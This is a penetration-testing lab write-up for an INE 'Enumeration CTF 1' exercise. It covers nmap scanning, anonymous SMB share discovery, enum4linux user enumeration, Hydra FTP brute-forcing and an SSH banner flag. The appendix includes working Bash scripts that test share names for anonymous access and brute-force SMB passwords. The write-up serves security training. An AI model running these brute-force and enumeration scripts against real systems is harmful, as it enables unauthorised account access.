# Assessment Methodologies: Enumeration CTF 1
### Capture The Flag Lab Writeup

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Lab Environment Overview](#2-lab-environment-overview)
3. [Initial Reconnaissance — Service Enumeration](#3-initial-reconnaissance--service-enumeration)
4. [Flag 1 — Anonymous SMB Share Access](#4-flag-1--anonymous-smb-share-access)
5. [Flag 2 — SMB User Enumeration and Password Brute-Force](#5-flag-2--smb-user-enumeration-and-password-brute-force)
6. [Flag 3 — Hidden FTP Service Discovery and Credential Attack](#6-flag-3--hidden-ftp-service-discovery-and-credential-attack)
7. [Flag 4 — SSH Banner Inspection](#7-flag-4--ssh-banner-inspection)
8. [Appendix A — Custom Scripts](#8-appendix-a--custom-scripts)
9. [Summary of Findings](#9-summary-of-findings)
10. [Conclusions and Lessons Learned](#10-conclusions-and-lessons-learned)

---

## 1. Introduction

This report documents the methodology, tools, and findings from a Capture The Flag (CTF) lab exercise titled **Assessment Methodologies: Enumeration CTF 1**, completed as part of a structured penetration testing curriculum. The primary objective of this lab was to perform thorough service enumeration against a Linux target machine and capture four flags concealed within its services and configurations.

The lab emphasises a core competency of professional penetration testing: the ability to enumerate services systematically, chain findings across multiple protocols, and leverage discovered credentials and intelligence to pivot between services. The four flags were progressively interdependent, requiring information gathered in earlier stages to unlock later ones.

The techniques exercised in this lab include:

- **Network port and service scanning** using Nmap
- **SMB share enumeration** via anonymous and authenticated access
- **SMB user enumeration** using `enum4linux`
- **Credential brute-forcing** against SMB and FTP services using Hydra and custom tooling
- **Full TCP port scanning** to discover non-standard service ports
- **FTP banner analysis** and targeted credential attacks
- **SSH banner inspection** for embedded flag content

All activities were performed within an isolated, authorised lab environment. No live or production systems were involved.

---

## 2. Lab Environment Overview

| Parameter        | Details                              |
|------------------|--------------------------------------|
| Attacker Machine | Kali Linux (GUI access provided)     |
| Target Hostname  | `target.ine.local`                   |
| Target MAC       | `02:42:C0:2E:DB:03`                  |
| Wordlists Path   | `/root/Desktop/wordlists/`           |
| Flag Format      | MD5 hash — `FLAG{<hash>}`            |

### Tools Used

| Tool         | Purpose                                                        |
|--------------|----------------------------------------------------------------|
| `nmap`       | Port scanning and service version detection                    |
| `smbclient`  | SMB share listing and authenticated/anonymous access           |
| `enum4linux` | SMB user enumeration                                           |
| `Hydra`      | Automated credential brute-forcing (FTP)                       |
| `ftp`        | FTP client for banner retrieval and file access                |
| `ssh`        | SSH client for pre-authentication banner inspection            |
| Custom Bash  | Anonymous SMB share scanner; SMB credential brute-forcer       |

### Objectives

Capture four flags embedded within the target's services by applying enumeration and credential attack techniques. The hints provided for each flag were:

- **Flag 1:** A Samba share permits anonymous access — enumerate it.
- **Flag 2:** A Samba user holds a weak password; their private share is at risk.
- **Flag 3:** Follow the hint embedded in Flag 2 to locate this flag.
- **Flag 4:** A warning banner intended to deter unauthorised login attempts contains the flag.

---

## 3. Initial Reconnaissance — Service Enumeration

The first step of the assessment was to conduct a fast service version scan using Nmap to identify open ports and the software versions running on the target machine.

### Command Used

```bash
nmap -sV -F target.ine.local
```

The `-sV` flag enables version detection against discovered open ports, and `-F` (fast mode) limits the scan to the approximately 100 most commonly used ports, reducing scan time while providing an adequate initial picture of the attack surface.

### Results

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

### Analysis

The fast scan revealed three services:

- **SSH (port 22):** A standard remote access service running OpenSSH. Noted for later investigation as a potential flag location or pivot point.
- **Samba (ports 139 and 445):** The presence of Samba on both the legacy NetBIOS-session (139) and modern SMB (445) ports confirmed an active Windows-compatible file-sharing service on the Linux host. This became the primary initial target for enumeration.

> **Note:** The fast scan did not reveal all running services, as it only examines a limited subset of all possible ports. A full TCP port scan performed later in the assessment uncovered a hidden FTP service on a non-standard port — described in detail in the Flag 3 section.

---

## 4. Flag 1 — Anonymous SMB Share Access

### Hint

> *"There is a samba share that allows anonymous access. Wonder what's in there!"*

### Methodology

SMB (Server Message Block) is a network file-sharing protocol commonly found on Linux systems running Samba. A frequent misconfiguration is the allowance of **null session** (anonymous, unauthenticated) access to one or more shares. Enumerating available shares without credentials is a standard first step in any SMB-focused assessment.

### Step 1: List Available SMB Shares (Anonymous)

The `smbclient` utility with the `-N` flag (suppress password prompt, i.e. null authentication) was used to retrieve the list of shares advertised by the target server.

```bash
smbclient -L //target.ine.local/ -N
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (target server (Samba, Ubuntu))
```

Only the two default administrative shares were listed. Attempting anonymous access to `print$` returned `NT_STATUS_ACCESS_DENIED`. Connecting to `IPC$` succeeded but yielded no accessible file content — consistent with its role as an inter-process communication endpoint rather than a file repository.

### Step 2: Enumerate Non-Advertised Shares via Wordlist

Since the default listing revealed no data-bearing shares, a share-name wordlist attack was conducted. The lab environment provided a file at `/root/Desktop/wordlists/shares.txt` containing a list of candidate share names. A custom Bash script (`smb_anon_check.sh`) was authored to iterate through this list, testing each name for anonymous accessibility using `smbclient`. Full script source is provided in [Appendix A](#8-appendix-a--custom-scripts).

```bash
./smb_anon_check.sh target.ine.local /root/Desktop/wordlists/shares.txt
```

**Summary of Output (42 shares tested):**

```
[-] NOT ACCESSIBLE : publicdata
[-] NOT ACCESSIBLE : communitydata
...
[+] ACCESSIBLE   : pubfiles
...
[*] Scan completed. Shares tested: 42, Accessible: 1.
```

One share — `pubfiles` — was found to be anonymously accessible.

### Step 3: Connect to the Share and Retrieve the Flag

```bash
smbclient //target.ine.local/pubfiles -N
```

```
smb: \> ls
  flag1.txt    N    40    Tue Jun 23 19:52:38 2026

smb: \> get flag1.txt
```

```bash
cat flag1.txt
```

```
FLAG1{######################################}
```

### Analysis

The `pubfiles` share was not visible in the default `smbclient -L` listing, indicating it was configured with the `browseable = no` option in the Samba configuration. This is a security-through-obscurity approach that provides no meaningful access control: the share remained accessible to any unauthenticated user who could guess or enumerate its name. This finding is representative of real-world deployments where administrators assume that unlisted shares are undiscoverable.

### Flag Captured

```
FLAG1{######################################}
```

---

## 5. Flag 2 — SMB User Enumeration and Password Brute-Force

### Hint

> *"One of the samba users have a bad password. Their private share with the same name as their username is at risk!"*

### Methodology

With the SMB service confirmed as a viable attack surface, the next step was to enumerate valid user accounts on the target. Once usernames were identified, a credential brute-force attack could be mounted against each user's private share — a configuration pattern in which each user's share bears the same name as their username.

### Step 1: Enumerate SMB Users with enum4linux

`enum4linux` is a comprehensive Samba and Windows enumeration tool that queries SMB services for user accounts, group memberships, share listings, and password policies. The `-U` flag restricts output to user account information.

```bash
enum4linux -U target.ine.local
```

**Relevant Output:**

```
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: josh     Name:   Desc:
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: nancy    Name:   Desc:
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc:
```

Three user accounts were enumerated: `josh`, `nancy`, and `bob`.

### Step 2: Brute-Force SMB Authentication

Hydra was initially attempted for SMB brute-forcing but returned the following error:

```
[ERROR] target smb://target.ine.local:445/ does not support SMBv1
```

Hydra's SMB module relies on the legacy SMBv1 protocol, which the target server had disabled — a common and recommended hardening measure. To work around this limitation, a custom Bash script was written that uses `smbclient` directly, which correctly negotiates modern SMB protocol versions. The script attempts to authenticate each user against their correspondingly named share using every password in the wordlist and reports the first successful credential pair. Full source is provided in [Appendix A](#8-appendix-a--custom-scripts).

```bash
./brute_smb.sh
```

**Output:**

```
[+] FOUND: josh:purple
```

The account `josh` was found to use the trivially weak password `purple`.

### Step 3: Access josh's Private Share and Retrieve the Flag

```bash
smbclient //target.ine.local/josh -U "josh"
Password for [WORKGROUP\josh]: purple
```

```
smb: \> ls
  flag2.txt    N    119    Tue Jun 23 19:52:38 2026

smb: \> get flag2.txt
```

```bash
cat flag2.txt
```

```
FLAG2{######################################}
Psst! I heard there is an FTP service running. Find it and check the banner.
```

### Analysis

The flag file contained both the flag value and an embedded hint pointing to a concealed FTP service, demonstrating a deliberate challenge-chaining design. The credential `josh:purple` was identified within the first pass of a standard Unix password list, illustrating the effectiveness of brute-force attacks against accounts with weak passwords. The pattern of naming private SMB shares after usernames — while administratively convenient — means that once a valid username is known, the corresponding share is immediately targetable.

### Flag Captured

```
FLAG2{######################################}
```

---

## 6. Flag 3 — Hidden FTP Service Discovery and Credential Attack

### Hint (from Flag 2)

> *"Psst! I heard there is an FTP service running. Find it and check the banner."*

### Methodology

The initial Nmap fast scan did not reveal any FTP service because fast scans only probe a small subset of ports. Acting on the hint embedded in the Flag 2 file, a full TCP port scan was conducted to identify any services running on non-standard ports.

### Step 1: Full TCP Port Scan

```bash
nmap -sV -p- target.ine.local
```

The `-p-` flag instructs Nmap to scan the full TCP port range (ports 1–65535), ensuring no service is overlooked regardless of the port number configured by the administrator.

**Full Results:**

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
5554/tcp open  ftp         vsftpd 2.0.8 or later
```

An FTP service running vsftpd was discovered on the non-standard port **5554** (the default FTP port is 21).

### Step 2: Connect to FTP and Inspect the Service Banner

FTP servers typically present a banner message upon connection. Connecting to the service on port 5554 using the `-p` flag to specify the non-standard port revealed a highly informative banner:

```bash
ftp target.ine.local -p 5554
```

**Banner Received:**

```
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley,
alice and amanda to change their weak passwords immediately!!!
```

The banner explicitly named three specific users — `ashley`, `alice`, and `amanda` — and acknowledged that their passwords were known to be weak. This constitutes a critical information disclosure vulnerability: a publicly visible service banner that confirms valid usernames and advertises their susceptibility to brute-force attacks.

### Step 3: Targeted FTP Brute-Force with Hydra

The three usernames disclosed by the banner were saved to a local file (`users.txt`), and Hydra was used to mount a targeted brute-force attack against the FTP service. The `-s` flag was used to specify the non-standard port.

```bash
hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554
```

**Output:**

```
[5554][ftp] host: target.ine.local   login: alice   password: pretty
```

Valid FTP credentials were recovered: `alice:pretty`.

### Step 4: Authenticate to FTP and Retrieve the Flag

```bash
ftp ftp://alice:pretty@target.ine.local -P 5554
```

```
ftp> ls
-rw-rw-r--    1 0    0    40    Jun 23 14:22 flag3.txt

ftp> get flag3.txt
```

```bash
cat flag3.txt
```

```
FLAG3{#############################}
```

### Analysis

This flag required a logical chain of steps across multiple phases: the hint was embedded in a prior flag file, the service was running on a deliberately non-standard port that evaded the initial fast scan, and the valid usernames were only discoverable through active connection and banner reading. The combination of deploying a service on an obscure port while simultaneously naming specific users in its public-facing banner exemplifies how misplaced reliance on obscurity can coexist with direct information disclosure.

### Flag Captured

```
FLAG3{#############################}
```

---

## 7. Flag 4 — SSH Banner Inspection

### Hint

> *"This is a warning meant to deter unauthorized users from logging in."*

### Methodology

SSH servers support a configurable pre-authentication banner — a message displayed to any connecting client before credentials are exchanged. These banners are frequently used for legal notice purposes, such as warning users that the system is monitored and that unauthorised access is prohibited. The lab hint explicitly referenced a deterrent warning displayed at login. Reviewing the services identified by Nmap, SSH on port 22 was the only service consistent with this description.

### Step 1: Connect to SSH and Read the Pre-Authentication Banner

```bash
ssh alice@target.ine.local
```

**Banner Displayed:**

```
********************************************************************
*                                                                  *
            WARNING: Unauthorized access to this system
            is strictly prohibited and may be subject to
            criminal prosecution.
*                                                                  *
            This system is for authorized users only.
            All activities on this system are monitored
            and recorded.
*                                                                  *
            By accessing this system, you consent to
            such monitoring and recording.
*                                                                  *
            If you are not an authorized user,
            disconnect immediately.
*                                                                  *
********************************************************************
*                                                                  *
    Is this what you're looking for?: FLAG4{###############################}
*                                                                  *
********************************************************************
```

The flag was embedded at the end of the SSH pre-authentication banner, appended below the standard legal warning block.

### Analysis

SSH pre-authentication banners are configured via the `Banner` directive in the server's `sshd_config` file, which points to an external text file displayed to all connecting clients before any credentials are requested. Because the banner is transmitted prior to authentication, it is readable by any unauthenticated user who can reach the SSH port — including unauthorised parties. In a production environment, embedding any sensitive data (tokens, flags, internal system identifiers) within a pre-authentication banner constitutes a significant information disclosure vulnerability.

### Flag Captured

```
FLAG4{###############################}
```

---

## 8. Appendix A — Custom Scripts

### A.1 — smb_anon_check.sh

This script was developed to enumerate non-advertised SMB shares by testing anonymous access against a list of candidate share names. For each name in the provided wordlist, it attempts a null-session connection using `smbclient` and reports whether the share is accessible.

```bash
#!/bin/bash
# ----------------------------------------------------------------------
# Script: smb_anon_check.sh
# Description: Tries anonymous access to SMB shares listed in a file.
# Usage: ./smb_anon_check.sh <SERVER> <SHARE_FILE>
# Example: ./smb_anon_check.sh 192.168.1.10 shares.txt
# ----------------------------------------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ "$#" -ne 2 ]; then
    echo -e "${YELLOW}[!] Usage: $0 <SERVER> <SHARE_FILE>${NC}"
    exit 1
fi

SERVER="$1"
SHARES_FILE="$2"

if ! command -v smbclient &> /dev/null; then
    echo -e "${RED}[ERROR] smbclient not found. Install it with: apt install smbclient${NC}"
    exit 1
fi

if [ ! -f "$SHARES_FILE" ]; then
    echo -e "${RED}[ERROR] File $SHARES_FILE does not exist or is not readable.${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Starting anonymous scan against ${SERVER} ...${NC}"
echo "-------------------------------------------"

COUNT=0
SUCCESS=0

while IFS= read -r line || [ -n "$line" ]; do
    share=$(echo "$line" | tr -d '\r' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
    if [ -z "$share" ] || [[ "$share" == \#* ]] || [[ "$share" == \;* ]]; then
        continue
    fi
    COUNT=$((COUNT + 1))
    if timeout 5 smbclient "//${SERVER}/${share}" -U "" -N -c 'ls' &>/dev/null; then
        echo -e "${GREEN}[+] ACCESSIBLE${NC}   : ${share}"
        SUCCESS=$((SUCCESS + 1))
    else
        echo -e "${RED}[-] NOT ACCESSIBLE${NC} : ${share}"
    fi
done < "$SHARES_FILE"

echo "-------------------------------------------"
echo -e "${YELLOW}[*] Scan completed.${NC} Shares tested: ${COUNT}, Accessible: ${SUCCESS}."
```

### A.2 — brute_smb.sh

This script performs a targeted credential brute-force attack against the SMB service by iterating over a list of discovered usernames and testing each entry in a provided password wordlist. It authenticates against the user's correspondingly named private share, bypassing the SMBv1 limitation that prevented Hydra from being used directly.

```bash
#!/bin/bash
USERS=("josh" "nancy" "bob")
WORDLIST="/root/Desktop/wordlists/unix_passwords.txt"
TARGET="target.ine.local"

for user in "${USERS[@]}"; do
    while IFS= read -r pass; do
        result=$(smbclient "//${TARGET}/${user}" -U "${user}%${pass}" -c "quit" 2>&1)
        if ! echo "$result" | grep -q "NT_STATUS_LOGON_FAILURE"; then
            echo "[+] FOUND: ${user}:${pass}"
            break
        fi
    done < "$WORDLIST"
done
```

---

## 9. Summary of Findings

| Flag   | Service       | Port  | Discovery Technique                             | Key Vulnerability                                     | Risk     |
|--------|---------------|-------|-------------------------------------------------|-------------------------------------------------------|----------|
| Flag 1 | SMB / Samba   | 445   | Share wordlist enumeration (anonymous)          | Non-advertised share accessible without credentials   | High     |
| Flag 2 | SMB / Samba   | 445   | User enumeration + credential brute-force       | Weak user password on a private named share           | High     |
| Flag 3 | FTP (vsftpd)  | 5554  | Full TCP scan + banner analysis + brute-force   | Non-standard port; usernames disclosed in FTP banner  | Critical |
| Flag 4 | SSH (OpenSSH) | 22    | Pre-authentication SSH banner inspection        | Sensitive data embedded in a publicly readable banner | Medium   |

### Vulnerabilities Identified

1. **Anonymous SMB Share Access (pubfiles)** — A share was accessible without any credentials and was intentionally excluded from the default browse listing. Security by obscurity provides no real protection when share names can be enumerated via wordlists.

2. **Weak SMB User Password (josh:purple)** — A user with a private SMB share was using a trivially guessable password that appeared early in a standard Unix password list, leaving their share fully exposed.

3. **FTP Service on Non-Standard Port (5554)** — Deploying the FTP service on port 5554 rather than port 21 provided no security benefit, as a full port scan trivially revealed it. Obscuring service ports does not substitute for proper access controls.

4. **Username and Password Weakness Disclosure in FTP Banner** — The FTP service banner named three specific valid system users and explicitly acknowledged that their passwords were weak, effectively providing an attacker with a pre-built target list for a brute-force attack.

5. **Sensitive Data in SSH Pre-Authentication Banner** — The SSH banner — visible to all connecting clients before authentication — contained the flag value. In a production context, embedding credentials, tokens, or any sensitive identifiers within a public-facing service banner represents a direct information disclosure vulnerability.

---

## 10. Conclusions and Lessons Learned

This lab demonstrated how a disciplined, methodological approach to service enumeration — combined with the willingness to chain findings from one stage into the next — is sufficient to achieve a comprehensive compromise of a misconfigured target. No single step required advanced exploitation techniques; the entire assessment relied on well-established enumeration tools and logical reasoning.

### Attack Chain Summary

```
Nmap Fast Scan
    └─► SMB Identified (ports 139, 445)
            └─► Anonymous Share Listing → pubfiles (via wordlist)
                    └─► FLAG 1 recovered

SMB User Enumeration (enum4linux)
    └─► Users: josh, nancy, bob
            └─► SMB Brute-Force → josh:purple
                    └─► FLAG 2 + Embedded Hint (hidden FTP service)

Nmap Full Port Scan (-p-)
    └─► FTP on port 5554 discovered
            └─► FTP Banner → alice, ashley, amanda named
                    └─► Hydra Brute-Force → alice:pretty
                            └─► FLAG 3 recovered

SSH Pre-Authentication Banner (port 22)
    └─► FLAG 4 embedded in banner text
```

### Key Takeaways

- **Fast port scans are insufficient for thorough assessments.** The FTP service on port 5554 would have been entirely missed without a full `-p-` scan. Full TCP port scans are an essential step in any professional enumeration phase.

- **SMB null sessions and non-advertised shares are not a security control.** Restricting browseable listings does not prevent access to a share that permits anonymous connections. Proper access controls — not obscurity — are the correct defence.

- **Password policies must be enforced technically, not just administratively.** A weak password such as `purple` collapsed under the very first pass of a common wordlist. Minimum complexity requirements and account lockout policies significantly reduce brute-force viability.

- **Service banners must never disclose operational or user-specific information.** The FTP banner that named users and acknowledged their weak passwords was arguably the single most damaging misconfiguration in the lab — it reduced a broad brute-force problem into a targeted, three-candidate attack. Banners should contain only generic legal notices.

- **Pre-authentication attack surfaces are fully exposed.** SSH banners, FTP banners, and SMTP greeting messages are all readable by unauthenticated parties. Any sensitive data embedded in these locations is effectively public.

- **Findings compound across services.** The credential `alice:pretty` recovered from FTP could be tested against SSH, providing a potential further lateral movement path. In real-world engagements, all recovered credentials should be tested across every identified service.

---

*Report completed: June 23, 2026*
*Lab: Assessment Methodologies: Enumeration CTF 1*
*Platform: INE Security / eLearnSecurity*
